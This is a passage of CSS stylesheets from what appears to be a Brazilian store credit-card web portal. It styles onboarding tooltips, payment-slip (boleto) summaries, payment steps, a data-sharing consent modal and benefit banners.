      </style>
      <style type="text/css">.firefox .onboarding-active tr.onboarding-item {
         z-index: 9; }
         .edge .onboarding-active tr td.onboarding-tooltip__overlay {
         padding: 0; }
         .onboarding-active {
         pointer-events: all; }
         .onboarding-active * {
         pointer-events: none; }
         .onboarding-active .onboarding-item {
         position: relative;
         z-index: 10 !important; }
         .onboarding-active tr.onboarding-item td:not(:last-child) {
         position: relative;
         z-index: 10;
         background: white; }
         .onboarding-tooltip__overlay {
         display: block;
         position: fixed;
         right: 50%;
         bottom: 50%;
         z-index: 9;
         border-radius: 100%;
         box-shadow: 0 0 0 180vh rgba(30, 30, 31, 0.7); }
         .not-logged .onboarding-tooltip,
         .onboarding-tooltip:not(.active) {
         display: none; }
         .onboarding-tooltip {
         display: block;
         position: fixed;
         top: unset;
         left: unset;
         z-index: 9;
         pointer-events: auto; }
         .onboarding-tooltip .onboarding-tooltip__text {
         text-align: center; }
         .onboarding-tooltip .onboarding-tooltip__actions {
         display: -webkit-box;
         display: flex;
         -webkit-box-pack: justify;
         justify-content: space-between;
         margin-top: 20px; }
         .onboarding-tooltip .onboarding-tooltip__actions button {
         width: 48%; }
         .onboarding-tooltip .onboarding-tooltip__container {
         position: absolute;
         z-index: 9;
         border-radius: 3px;
         background-color: white;
         padding: 20px;
         width: 270px; }
         .onboarding-tooltip .onboarding-tooltip__container .arrow {
         position: absolute;
         content: ""; }
         .onboarding-tooltip--center .onboarding-tooltip__container {
         left: 50%;
         -webkit-transform: translateX(-50%);
         transform: translateX(-50%); }
         .onboarding-tooltip--arrow-top .onboarding-tooltip__container .arrow {
         top: -9px;
         left: calc(50% - 10px);
         border-right: 10px solid transparent;
         border-bottom: 10px solid white;
         border-left: 10px solid transparent; }
         .onboarding-tooltip--arrow-bottom .onboarding-tooltip__container .arrow {
         top: 100%;
         left: calc(50% - 10px);
         border-top: 10px solid white;
         border-right: 10px solid transparent;
         border-left: 10px solid transparent; }
         .onboarding-tooltip--arrow-left .onboarding-tooltip__container .arrow {
         top: calc(50% - 10px);
         left: -9px;
         border-top: 10px solid transparent;
         border-right: 10px solid white;
         border-bottom: 10px solid transparent; }
         .onboarding-tooltip--arrow-right .onboarding-tooltip__container .arrow {
         top: calc(50% - 10px);
         left: 100%;
         border-top: 10px solid transparent;
         border-bottom: 10px solid transparent;
         border-left: 10px solid white; }
         @media (max-width: 767px) {
         .onboarding-tooltip {
         left: 50% !important; }
         .onboarding-tooltip .onboarding-tooltip__container {
         -webkit-transform: translateX(-50%);
         transform: translateX(-50%); } }
      </style>
      <style type="text/css">.firefox .onboarding-active tr.onboarding-item {
         z-index: 9; }
         .edge .onboarding-active tr td.onboarding-tooltip__overlay {
         padding: 0; }
         .onboarding-active {
         pointer-events: all; }
         .onboarding-active * {
         pointer-events: none; }
         .onboarding-active .onboarding-item {
         position: relative;
         z-index: 10 !important; }
         .onboarding-active tr.onboarding-item td:not(:last-child) {
         position: relative;
         z-index: 10;
         background: white; }
         .onboarding-tooltip__overlay {
         display: block;
         position: fixed;
         right: 50%;
         bottom: 50%;
         z-index: 9;
         border-radius: 100%;
         box-shadow: 0 0 0 180vh rgba(30, 30, 31, 0.7); }
         .not-logged .onboarding-tooltip,
         .onboarding-tooltip:not(.active) {
         display: none; }
         .onboarding-tooltip {
         display: block;
         position: fixed;
         top: unset;
         left: unset;
         z-index: 9;
         pointer-events: auto; }
         .onboarding-tooltip .onboarding-tooltip__text {
         text-align: center; }
         .onboarding-tooltip .onboarding-tooltip__actions {
         display: -webkit-box;
         display: flex;
         -webkit-box-pack: justify;
         justify-content: space-between;
         margin-top: 20px; }
         .onboarding-tooltip .onboarding-tooltip__actions button {
         width: 48%; }
         .onboarding-tooltip .onboarding-tooltip__container {
         position: absolute;
         z-index: 9;
         border-radius: 3px;
         background-color: white;
         padding: 20px;
         width: 270px; }
         .onboarding-tooltip .onboarding-tooltip__container .arrow {
         position: absolute;
         content: ""; }
         .onboarding-tooltip--center .onboarding-tooltip__container {
         left: 50%;
         -webkit-transform: translateX(-50%);
         transform: translateX(-50%); }
         .onboarding-tooltip--arrow-top .onboarding-tooltip__container .arrow {
         top: -9px;
         left: calc(50% - 10px);
         border-right: 10px solid transparent;
         border-bottom: 10px solid white;
         border-left: 10px solid transparent; }
         .onboarding-tooltip--arrow-bottom .onboarding-tooltip__container .arrow {
         top: 100%;
         left: calc(50% - 10px);
         border-top: 10px solid white;
         border-right: 10px solid transparent;
         border-left: 10px solid transparent; }
         .onboarding-tooltip--arrow-left .onboarding-tooltip__container .arrow {
         top: calc(50% - 10px);
         left: -9px;
         border-top: 10px solid transparent;
         border-right: 10px solid white;
         border-bottom: 10px solid transparent; }
         .onboarding-tooltip--arrow-right .onboarding-tooltip__container .arrow {
         top: calc(50% - 10px);
         left: 100%;
         border-top: 10px solid transparent;
         border-bottom: 10px solid transparent;
         border-left: 10px solid white; }
         @media (max-width: 767px) {
         .onboarding-tooltip {
         left: 50% !important; }
         .onboarding-tooltip .onboarding-tooltip__container {
         -webkit-transform: translateX(-50%);
         transform: translateX(-50%); } }
         .onboarding-button {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         margin: 30px 0 0;
         cursor: pointer;
         width: 170px;
         -webkit-user-select: none;
         -moz-user-select: none;
         -ms-user-select: none;
         user-select: none; }
         .onboarding-button .text {
         margin: 0 0 0 13px;
         text-transform: uppercase;
         color: #1e1e1f;
         font-size: 14px;
         font-weight: 500; }
         .onboarding-button__tooltip {
         position: absolute;
         bottom: 40px;
         z-index: 1;
         border: 1px solid #acacac;
         border-radius: 7px;
         box-shadow: 0 0 5px 0 rgba(0, 0, 0, 0.3);
         background: white;
         padding: 11px;
         width: 305px;
         height: 85px; }
         .onboarding-button__tooltip .tooltip-text {
         line-height: 15px;
         font-size: 12px; }
         .onboarding-button__tooltip .button {
         position: absolute;
         right: 11px;
         bottom: 11px;
         width: 100px;
         height: 30px;
         line-height: 0;
         font-size: 14px; }
         .onboarding-button__tooltip:after, .onboarding-button__tooltip:before {
         position: absolute;
         left: 15px;
         -webkit-transform: translateX(-50%);
         transform: translateX(-50%);
         width: 0;
         height: 0;
         content: ""; }
         .onboarding-button__tooltip:before {
         bottom: -8px;
         z-index: 2;
         border-top: 8px solid white;
         border-right: 8px solid transparent;
         border-left: 8px solid transparent; }
         .onboarding-button__tooltip:after {
         bottom: -9px;
         z-index: 1;
         border-top: 9px solid rgba(0, 0, 0, 0.3);
         border-right: 9px solid transparent;
         border-left: 9px solid transparent; }
         .onboarding-button .icon svg {
         width: 30px;
         height: 30px; }
         @media (max-width: 767px) {
         .onboarding-button--holder {
         position: fixed;
         bottom: 61px;
         left: 11px;
         z-index: -1; }
         .onboarding-button {
         margin: 0;
         width: 30px; }
         .onboarding-button .text {
         display: none; }
         .onboarding-button .icon svg {
         width: 30px;
         height: 30px; } }
         .ie .modal.modal-onboarding-portal .modal__info .info__message {
         max-width: 100%; }
         .modal.modal-onboarding-portal {
         width: 970px; }
         .modal.modal-onboarding-portal .modal__title-greeting {
         margin-bottom: 10px; }
         .modal.modal-onboarding-portal .modal__content {
         margin-bottom: 30px; }
         .modal.modal-onboarding-portal .modal__info {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         -webkit-box-orient: vertical;
         -webkit-box-direction: normal;
         flex-direction: column; }
         .modal.modal-onboarding-portal .modal__info .info__icon {
         margin-bottom: 20px;
         width: 140px;
         height: 140px; }
         .modal.modal-onboarding-portal .modal__info .info__message {
         margin-bottom: 0;
         text-align: center;
         font-weight: 300; }
         .modal.modal-onboarding-portal .modal__desbloqueio-message {
         margin-top: 20px;
         font-size: 12px;
         font-weight: 300; }
         .modal.modal-onboarding-portal .modal__actions .button {
         width: 370px; }
         @media (max-width: 767px) {
         .modal.modal-onboarding-portal {
         display: -webkit-box;
         display: flex;
         -webkit-box-orient: vertical;
         -webkit-box-direction: normal;
         flex-direction: column;
         -webkit-box-pack: space-evenly;
         justify-content: space-evenly;
         margin: 0;
         border-radius: 0;
         width: 100%;
         height: 100%; }
         .modal.modal-onboarding-portal .modal__content {
         margin-bottom: 20px; }
         .modal.modal-onboarding-portal .modal__info {
         -webkit-box-orient: horizontal;
         -webkit-box-direction: normal;
         flex-direction: row;
         margin-bottom: 20px;
         font-size: 14px; }
         .modal.modal-onboarding-portal .modal__info .info__icon {
         flex-shrink: 0;
         margin-bottom: 0;
         width: 80px;
         height: 80px; }
         .modal.modal-onboarding-portal .modal__info .info__message {
         margin-left: 10px;
         text-align: left; }
         .modal.modal-onboarding-portal .modal__desbloqueio-message {
         margin-top: 0; }
         .modal.modal-onboarding-portal .modal__actions .button {
         width: 100%; } }
      </style>
      <style type="text/css">.modal__carnes-content {
         display: -webkit-box;
         display: flex;
         flex-wrap: wrap;
         -webkit-box-pack: justify;
         justify-content: space-between;
         margin-bottom: -20px;
         padding-right: 3px;
         padding-left: 3px; }
         .modal__carnes-content__animated-boleto {
         margin-bottom: 10px;
         width: 47%; }
         .animated-boleto__border {
         position: relative; }
         .animated-boleto__border:after {
         position: absolute;
         top: 0;
         right: 0;
         bottom: 0;
         left: 0;
         -webkit-transition: box-shadow 2s;
         transition: box-shadow 2s;
         border: 0 solid #3ecf7a;
         border-radius: 4px;
         content: ""; }
         .animated-boleto__border__animation:after {
         -webkit-animation: animate-shadow 2s linear 0s forwards, animate-border 1s linear 1s forwards;
         animation: animate-shadow 2s linear 0s forwards, animate-border 1s linear 1s forwards; }
         .animated-boleto__icon {
         position: absolute;
         top: -7px;
         left: -10px;
         opacity: 0;
         z-index: 1; }
         .animated-boleto__icon__animation {
         -webkit-animation: animate-icon 0.5s linear 1.5s forwards;
         animation: animate-icon 0.5s linear 1.5s forwards; }
         .ie .animated-boleto__border__animation:after,
         .edge .animated-boleto__border__animation:after {
         -webkit-animation: animate-shadow-ie 2s linear 2s forwards, animate-border 1s linear 3s forwards;
         animation: animate-shadow-ie 2s linear 2s forwards, animate-border 1s linear 3s forwards; }
         @-webkit-keyframes animate-icon {
         to {
         opacity: 1; } }
         @keyframes animate-icon {
         to {
         opacity: 1; } }
         @-webkit-keyframes animate-border {
         from {
         border-width: 1px; }
         to {
         border-width: 2px; } }
         @keyframes animate-border {
         from {
         border-width: 1px; }
         to {
         border-width: 2px; } }
         @-webkit-keyframes animate-shadow {
         from {
         box-shadow: inset 1px 1px 4px rgba(0, 0, 0, 0.25); }
         to {
         box-shadow: 2px 2px 4px rgba(0, 0, 0, 0.25); } }
         @keyframes animate-shadow {
         from {
         box-shadow: inset 1px 1px 4px rgba(0, 0, 0, 0.25); }
         to {
         box-shadow: 2px 2px 4px rgba(0, 0, 0, 0.25); } }
         @-webkit-keyframes animate-shadow-ie {
         0% {
         box-shadow: inset 2px 2px 4px rgba(0, 0, 0, 0.25); }
         100% {
         box-shadow: inset 0 0 0 rgba(0, 0, 0, 0.25); } }
         @keyframes animate-shadow-ie {
         0% {
         box-shadow: inset 2px 2px 4px rgba(0, 0, 0, 0.25); }
         100% {
         box-shadow: inset 0 0 0 rgba(0, 0, 0, 0.25); } }
      </style>
      <style type="text/css">.pagamento-panel-header_titulo, .pagamento-panel-header_descricao {
         text-transform: none;
         font-weight: 400; }
         .pagamento-panel-header_titulo {
         margin: 2px;
         font-size: 16px; }
         .pagamento-panel-header_descricao {
         color: #acacac;
         font-size: 12px; }
         .tab-header-item:not(.tab-header-item--active) .pagamento-panel-header {
         color: #acacac; }
         .tab-header-item--active .pagamento-panel-header_descricao {
         font-weight: 400; }
         .tab-header-item--active .pagamento-panel-header_titulo {
         font-size: 18px;
         font-weight: 700; }
      </style>
      <style type="text/css">.pagamento-boleto-resumo.loading {
         position: relative; }
         .pagamento-boleto-resumo.loading .loader {
         position: absolute;
         top: 0;
         right: 0;
         bottom: 0;
         left: 0;
         margin: auto; }
         .pagamento-boleto-resumo {
         margin-bottom: 20px;
         border: 1px solid #e0e0e0;
         width: 405px;
         height: 175px; }
         .pagamento-boleto-resumo i.icon-button {
         cursor: pointer; }
         .pagamento-boleto-resumo i.icon-button svg {
         width: 16px;
         height: 16px; }
         .pagamento-boleto-resumo_detalhes {
         display: -webkit-box;
         display: flex;
         padding: 20px; }
         .pagamento-boleto-resumo_detalhes .valores-area {
         -webkit-box-flex: 1;
         flex: 1; }
         .pagamento-boleto-resumo_detalhes .close-area {
         position: relative;
         width: 25px; }
         .pagamento-boleto-resumo_detalhes .close-area i.icon-button {
         position: absolute;
         top: 0;
         right: 0; }
         .pagamento-boleto-resumo_detalhes__item {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: end;
         align-items: flex-end;
         -webkit-box-pack: justify;
         justify-content: space-between;
         color: #706f6f; }
         .pagamento-boleto-resumo_detalhes__item .linha {
         -webkit-box-flex: 1;
         flex: 1;
         margin: 0 5px;
         margin-bottom: 5px;
         border: 0;
         border-top: 1px solid #acacac;
         border-style: dashed; }
         .pagamento-boleto-resumo_detalhes__item .texto,
         .pagamento-boleto-resumo_detalhes__item .valor {
         margin: 0;
         font-size: 12px; }
         .pagamento-boleto-resumo_detalhes__item .valor {
         font-weight: bold; }
         .pagamento-boleto-resumo_detalhes__item:last-child .valor {
         color: #1e1e1f; }
         .pagamento-boleto-resumo_principal {
         padding: 20px;
         height: 130px; }
         .pagamento-boleto-resumo_principal--top {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: start;
         align-items: flex-start;
         -webkit-box-pack: justify;
         justify-content: space-between; }
         .pagamento-boleto-resumo_principal--top .valor-total-holder {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center; }
         .pagamento-boleto-resumo_principal--top .valor-total-holder .boleto_valor-total {
         line-height: 0;
         color: #1e1e1f;
         font-size: 18px;
         font-weight: 900; }
         .pagamento-boleto-resumo_principal--top .valor-total-holder .icon-button {
         margin-left: 5px; }
         .pagamento-boleto-resumo_principal--top .bar-code.icon-button svg {
         margin-bottom: 27px;
         width: 100px;
         height: 15px; }
         .pagamento-boleto-resumo_principal--bot {
         display: -webkit-box;
         display: flex;
         color: #706f6f; }
         .pagamento-boleto-resumo_principal--bot .parcelas-vencimento-holder {
         display: -webkit-box;
         display: flex;
         -webkit-box-orient: vertical;
         -webkit-box-direction: normal;
         flex-direction: column; }
         .pagamento-boleto-resumo_principal--bot .parcelas-vencimento-holder span {
         text-align: right;
         color: #706f6f; }
         .pagamento-boleto-resumo_acoes {
         display: -webkit-box;
         display: flex; }
         .pagamento-boleto-resumo_acoes__item {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         -webkit-box-flex: 1;
         flex: 1;
         -webkit-box-pack: center;
         justify-content: center;
         -webkit-transition: background-color 300ms;
         transition: background-color 300ms;
         border-top: 1px solid #e0e0e0;
         padding: 10px;
         text-decoration: none; }
         .pagamento-boleto-resumo_acoes__item:hover {
         background: #f2f2f2; }
         .pagamento-boleto-resumo_acoes__item i.icon-button {
         margin-right: 8px; }
         .pagamento-boleto-resumo_acoes__item i.icon-button svg {
         width: 18px;
         height: 18px; }
         .pagamento-boleto-resumo_acoes__item:last-child {
         border-left: 1px solid #e0e0e0; }
         @media (min-width: 768px) {
         .pagamento-boleto-resumo .pagamento-boleto-resumo_principal--bot {
         -webkit-box-pack: justify;
         justify-content: space-between; }
         .pagamento-boleto-resumo .pagamento-boleto-resumo_principal--bot .linha-digitavel-holder {
         max-width: 255px; } }
         @media (max-width: 767px) {
         .pagamento-boleto-resumo {
         width: unset;
         max-width: 440px; }
         .pagamento-boleto-resumo_principal--bot .parcelas-vencimento-holder {
         display: block;
         line-height: 1.5; }
         .pagamento-boleto-resumo_principal--bot .parcelas-vencimento-holder span {
         font-size: 11px; }
         .pagamento-boleto-resumo_principal--bot .boleto_linha-digitavel {
         font-size: 11px; }
         .pagamento-boleto-resumo_principal--top .valor-total-holder .boleto_valor-total {
         font-size: 16px; } }
      </style>
      <style type="text/css">.pagamento-passo-boleto_header h3 {
         margin: 0;
         margin-bottom: 20px;
         color: #706f6f;
         font-size: 16px;
         font-weight: 300; }
         .pagamento-passo-boleto_acoes {
         margin-top: 10px; }
         .pagamento-passo-boleto_resumos {
         display: -webkit-box;
         display: flex;
         flex-wrap: wrap;
         -webkit-box-pack: justify;
         justify-content: space-between; }
         .pagamento-passo-boleto_resumos pagamento-boleto-resumo {
         -webkit-box-flex: 0;
         flex: 0 0 49%; }
         @media (max-width: 1023px) {
         .pagamento-passo-boleto .pagamento-passo-boleto_resumos pagamento-boleto-resumo {
         -webkit-box-flex: 0;
         flex: 0 0 100%; } }
         @media (max-width: 767px) {
         .pagamento-passo-boleto_acoes a {
         width: 100%; }
         .pagamento-passo-boleto_header h3 {
         margin-top: 10px; } }
      </style>
      <style type="text/css">.pagamento-passo-vencimento .calendar,
         .pagamento-passo-vencimento .pagamento-passo-vencimento_descricao {
         width: 320px; }
         .pagamento-passo-vencimento .textfield--with-icon .textfield__label {
         left: 23px; }
         .pagamento-passo-vencimento .textfield--with-icon .textfield__input {
         padding-left: 23px;
         line-height: 1; }
         .pagamento-passo-vencimento .calendar .calendar__container {
         right: initial; }
         .pagamento-passo-vencimento .calendar .textfield .field-message.field-message--error {
         display: none; }
         .pagamento-passo-vencimento .pagamento-passo-vencimento_descricao {
         margin-top: 5px;
         line-height: 15px;
         color: #706f6f;
         font-size: 12px; }
         .pagamento-passo-vencimento .pagamento-passo-vencimento_acoes {
         display: -webkit-box;
         display: flex;
         -webkit-box-pack: justify;
         justify-content: space-between;
         margin-top: 40px; }
         @media (max-width: 767px) {
         .pagamento-passo-vencimento .calendar,
         .pagamento-passo-vencimento .pagamento-passo-vencimento_descricao {
         width: 100%; }
         .pagamento-passo-vencimento .pagamento-passo-vencimento_acoes {
         -webkit-box-orient: vertical;
         -webkit-box-direction: normal;
         flex-direction: column;
         margin-top: 20px; }
         .pagamento-passo-vencimento .pagamento-passo-vencimento_acoes .button {
         width: 100%; }
         .pagamento-passo-vencimento .pagamento-passo-vencimento_acoes .button:last-child {
         margin-top: 10px; } }
      </style>
      <style type="text/css">.pagamento-header {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: end;
         align-items: flex-end;
         -webkit-box-pack: justify;
         justify-content: space-between;
         margin: 30px 0; }
         .pagamento-header_quantidade, .pagamento-header_total {
         line-height: 22px; }
         .pagamento-header_quantidade {
         color: #706f6f;
         font-size: 16px;
         font-weight: 300; }
         .pagamento-header_total {
         color: #1e1e1f;
         font-size: 18px;
         font-weight: 700; }
         .pagamento-header_separator {
         -webkit-box-flex: 1;
         flex: 1;
         margin: 0 5px;
         margin-bottom: 5px;
         border: 0;
         border-top: 1px solid #acacac;
         border-style: dashed; }
         @media (max-width: 767px) {
         .pagamento-header_quantidade {
         font-size: 14px; }
         .pagamento-header_total {
         font-size: 16px; } }
      </style>
      <style type="text/css">.pagamento-titulo h1 {
         margin: 0;
         text-transform: lowercase;
         font-size: 22px;
         font-weight: 300; }
      </style>
      <style type="text/css">.pagamento-tutorial-status {
         display: inline-block;
         position: relative;
         width: 280px;
         height: 66px; }
         @-webkit-keyframes arrow-shaft-anim {
         0% {
         opacity: 1;
         width: 0;
         height: 0; }
         65% {
         opacity: 1;
         width: 25px;
         height: 25px; }
         100% {
         opacity: 1;
         width: 25px;
         height: 25px; } }
         @keyframes arrow-shaft-anim {
         0% {
         opacity: 1;
         width: 0;
         height: 0; }
         65% {
         opacity: 1;
         width: 25px;
         height: 25px; }
         100% {
         opacity: 1;
         width: 25px;
         height: 25px; } }
         @-webkit-keyframes arrow-head-anim {
         0% {
         border-width: 0;
         top: calc(100% - 9px);
         left: calc(100% - 0);
         width: 0;
         height: 0; }
         50% {
         border-width: 0;
         top: calc(100% - 9px);
         left: calc(100% - 0);
         width: 0;
         height: 0; }
         65% {
         border-width: 2px;
         top: calc(100% - 9px);
         left: calc(100% - 4px);
         width: 10px;
         height: 10px; }
         100% {
         border-width: 2px;
         top: calc(100% - 9px);
         left: calc(100% - 4px);
         width: 10px;
         height: 10px; } }
         @keyframes arrow-head-anim {
         0% {
         border-width: 0;
         top: calc(100% - 9px);
         left: calc(100% - 0);
         width: 0;
         height: 0; }
         50% {
         border-width: 0;
         top: calc(100% - 9px);
         left: calc(100% - 0);
         width: 0;
         height: 0; }
         65% {
         border-width: 2px;
         top: calc(100% - 9px);
         left: calc(100% - 4px);
         width: 10px;
         height: 10px; }
         100% {
         border-width: 2px;
         top: calc(100% - 9px);
         left: calc(100% - 4px);
         width: 10px;
         height: 10px; } }
         .pagamento-tutorial-status .animated-arrow {
         box-sizing: border-box;
         position: absolute;
         top: 3px;
         left: 178px;
         opacity: 0;
         border: 2px solid #d71920;
         border-bottom: 0;
         border-left: 0;
         border-top-right-radius: 25px;
         -webkit-animation: arrow-shaft-anim 1s linear 0.5s forwards;
         animation: arrow-shaft-anim 1s linear 0.5s forwards; }
         .pagamento-tutorial-status .animated-arrow:after {
         position: absolute;
         -webkit-transform: rotate(45deg);
         transform: rotate(45deg);
         border: 2px solid #d71920;
         border-top: none;
         border-left: none;
         -webkit-animation: arrow-head-anim 1s ease infinite;
         animation: arrow-head-anim 1s ease infinite;
         content: "";
         -webkit-animation: arrow-head-anim 1s linear 0.5s forwards;
         animation: arrow-head-anim 1s linear 0.5s forwards;
         width: 10px;
         height: 10px;
         top: calc(100% - 9px);
         left: calc(100% - 4px); }
      </style>
      <style type="text/css">.pagamento-carnes {
         display: block; }
         .pagamento-carnes .panel__cell {
         border: none;
         padding: 0; }
      </style>
      <style type="text/css">.modal.modal--medium.modal-compartilhar-dados-ltm {
         padding: 25px 40px 40px; }
         .modal-compartilhar-dados-ltm .modal__close {
         width: 30px;
         font-size: 20px;
         height: 30px;
         background: #1E1E1F;
         border: 2px solid #1E1E1F;
         border-radius: 0px; }
         .modal-compartilhar-dados-ltm .modal__content {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         -webkit-box-orient: vertical;
         -webkit-box-direction: normal;
         flex-flow: column;
         margin: 0;
         text-align: center; }
         .modal-compartilhar-dados-ltm h1 {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         flex-wrap: wrap;
         -webkit-box-pack: center;
         justify-content: center;
         font-size: 24px;
         font-weight: 900; }
         .modal-compartilhar-dados-ltm p {
         margin: 0;
         max-width: 100%; }
         .modal-compartilhar-dados-ltm__inline-icon {
         margin-left: 10px;
         width: 150px;
         height: 19px; }
         .modal-compartilhar-dados-ltm__icon {
         width: 55px;
         height: 55px; }
         .modal .modal__footer.modal-compartilhar-dados-ltm__footer {
         display: -webkit-box;
         display: flex;
         flex-wrap: wrap;
         -webkit-box-pack: justify;
         justify-content: space-between;
         border-top: 2px solid #e0e0e0;
         background: #fff; }
         .modal .modal__footer.modal-compartilhar-dados-ltm__footer .modal-compartilhar-dados-ltm__footer__check {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         margin-bottom: 20px; }
         .modal .modal__footer.modal-compartilhar-dados-ltm__footer .modal-compartilhar-dados-ltm__footer__check label {
         margin-left: 14px;
         text-transform: none;
         color: #1e1e1f;
         font-size: 14px; }
         .modal .modal__footer.modal-compartilhar-dados-ltm__footer .modal-compartilhar-dados-ltm__footer__buttons {
         display: -webkit-box;
         display: flex;
         -webkit-box-pack: center;
         justify-content: center;
         width: 100%; }
         .modal .modal__footer.modal-compartilhar-dados-ltm__footer .modal-compartilhar-dados-ltm__footer__buttons .button {
         margin-right: 15px;
         font-weight: 700;
         font-size: 16px;
         text-transform: uppercase;
         border-radius: 0px; }
         .modal .modal__footer.modal-compartilhar-dados-ltm__footer .modal-compartilhar-dados-ltm__footer__buttons .button:disabled {
         color: #ACACAC; }
         .modal .modal__footer.modal-compartilhar-dados-ltm__footer .modal-compartilhar-dados-ltm__footer__buttons .loader,
         .modal .modal__footer.modal-compartilhar-dados-ltm__footer .modal-compartilhar-dados-ltm__footer__buttons .button {
         width: 100%; }
      </style>
      <style type="text/css">.cartao-renner .bg-themed,
         .meu-cartao .cartao-renner .bg-themed {
         background-color: #d71920; }
         .cartao-renner .bg-themed--selected {
         background-color: #810f13; }
         .cartao-renner .border-themed,
         .meu-cartao .cartao-renner .border-themed {
         border-color: #d71920; }
         .cartao-renner .border-themed--selected {
         border-color: #810f13; }
         .cartao-renner .text-themed,
         .meu-cartao .cartao-renner .text-themed {
         color: #d71920; }
         .cartao-renner .text-themed--selected {
         color: #810f13; }
         .cartao-renner.theme-priority .bg-themed {
         background-color: #ac8947; }
         .cartao-renner.theme-priority .border-themed {
         border-color: #ac8947; }
         .cartao-renner.theme-priority .text-themed {
         color: #ac8947; }
         .meu-cartao .bg-themed,
         .cartao-renner .meu-cartao .bg-themed {
         background-color: #ac8947; }
         .meu-cartao .bg-themed--selected {
         border-color: #997a3f; }
         .meu-cartao .border-themed,
         .cartao-renner .meu-cartao .border-themed {
         border-color: #ac8947; }
         .meu-cartao .bg-themed--selected {
         background-color: #997a3f; }
         .meu-cartao .text-themed,
         .cartao-renner .meu-cartao .text-themed {
         color: #ac8947; }
         .meu-cartao .text-themed--selected {
         color: #997a3f; }
         .meu-cartao.theme-priority .bg-themed {
         background-color: #ac8947; }
         .meu-cartao.theme-priority .border-themed {
         border-color: #ac8947; }
         .meu-cartao.theme-priority .text-themed {
         color: #ac8947; }
         .cartao-renner .hidden-for-cartao-renner {
         display: none; }
         .meu-cartao .hidden-for-meu-cartao {
         display: none; }
         @media (max-width: 767px) {
         .parceiros {
         margin-top: -10px;
         margin-left: -10px;
         width: 100vw; } }
         .banner-beneficios-disponiveis {
         padding: 50px 20px; }
         .banner-beneficios-disponiveis h2 {
         width: 55%;
         min-width: 210px;
         line-height: 36px;
         color: #ac8947;
         font-size: 32px;
         font-weight: 900; }
         .banner-beneficios-disponiveis a {
         cursor: pointer;
         text-decoration: none;
         color: #ac8947;
         font-weight: 700; }
         .banner-beneficios-disponiveis__beneficios {
         display: -webkit-box;
         display: flex; }
         .banner-beneficios-disponiveis__beneficio {
         position: relative;
         padding-right: 20px;
         width: 33.33%; }
         .banner-beneficios-disponiveis__beneficio__flag {
         position: absolute;
         top: 0;
         left: 6px; }
         .banner-beneficios-disponiveis__beneficio__flag svg {
         width: 58px;
         height: 58px;
         color: #ac8947; }
         .banner-beneficios-disponiveis__beneficio__flag__text {
         position: absolute;
         width: 100%;
         text-align: center;
         line-height: 54px;
         color: #fff;
         font-size: 18px;
         font-weight: 700; }
         .banner-beneficios-disponiveis__beneficio__text {
         max-width: 100%; }
         .banner-beneficios-disponiveis__beneficio__content {
         box-sizing: border-box;
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         -webkit-box-orient: vertical;
         -webkit-box-direction: normal;
         flex-flow: column;
         justify-content: space-around;
         box-shadow: 0 0px 20px rgba(0, 0, 0, 0.15);
         background: white;
         padding: 12px 16px 20px;
         height: 100%;
         text-align: center;
         line-height: 20px;
         color: #706f6f;
         font-size: 14px; }
         .banner-beneficios-disponiveis__beneficio__content img {
         padding: 0 4px;
         max-height: 96px; }
         button.button.button--outline.banner-beneficios-disponiveis__beneficio__button {
         border: initial;
         padding: 0; }
         button.button.button--outline.banner-beneficios-disponiveis__beneficio__button:active {
         border: initial;
         background: #fff;
         color: #ac8947; }
         @media (min-width: 1024px) {
         __beneficio:last-child {
         padding: 0; } }
         @media (max-width: 1023px) {
         .banner-beneficios-disponiveis {
         padding: 30px 0; }
         .banner-beneficios-disponiveis__beneficios {
         padding: 20px;
         overflow-x: scroll; }
         .banner-beneficios-disponiveis__beneficio {
         min-width: 265px; }
         .banner-beneficios-disponiveis h2 {
         margin: 6px 0 12px;
         width: 100%;
         font-size: 20px; } }
         @media (max-width: 767px) {
         .banner-beneficios-disponiveis {
         padding: 30px 0; }
         .banner-beneficios-disponiveis__separator {
         display: block;
         margin-left: 20px; }
         .banner-beneficios-disponiveis h2 {
         padding-right: 20px;
         padding-left: 20px; } }
         #banner-beneficios-disponiveis::-webkit-scrollbar {
         width: 0;
         height: 0; }
      </style>
      <style type="text/css">.banner-beneficios-exclusivos {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: end;
         align-items: flex-end;
         background: -webkit-gradient(linear, left top, right top, color-stop(20%, white), color-stop(90%, transparent)), url(../images/modelo-banner.png);
         background: linear-gradient(to right, white 20%, transparent 90%), url(../images/modelo-banner.png);
         background-position: right top;
         background-repeat: no-repeat; }
         .banner-beneficios-exclusivos__content {
         margin-top: 38px;
         margin-right: 30px;
         max-width: 330px;
         color: #706f6f; }
         .banner-beneficios-exclusivos__title {
         margin-top: 30px;
         line-height: 36px;
         color: #ac8947;
         font-weight: 900; }
         .banner-beneficios-exclusivos__title svg {
         display: inline;
         margin-top: 10px;
         height: 25px; }
         .banner-beneficios-exclusivos__cartao {
         margin-top: 38px;
         margin-bottom: -10px; }
         @media (max-width: 1023px) {
         .banner-beneficios-exclusivos {
         background-size: contain; } }
         @media (min-width: 768px) and (max-width: 1023px) {
         .banner-beneficios-exclusivos {
         font-size: 12px; }
         .banner-beneficios-exclusivos h1 {
         margin-top: 12px;
         line-height: 32px;
         line-height: 30px;
         font-size: 20px; }
         .banner-beneficios-exclusivos h1 svg {
         height: 16px; }
         .banner-beneficios-exclusivos__content {
         margin: 0;
         max-width: 200px; }
         .banner-beneficios-exclusivos__content p {
         margin-bottom: 0; }
         .banner-beneficios-exclusivos__cartao {
         margin-bottom: -10px;
         width: 150px;
         height: auto; } }
         @media (max-width: 767px) {
         .banner-beneficios-exclusivos {
         display: -webkit-box;
         display: flex;
         -webkit-box-orient: vertical;
         -webkit-box-direction: reverse;
         flex-flow: wrap-reverse;
         background-size: auto 120px; }
         .banner-beneficios-exclusivos p {
         text-align: center; }
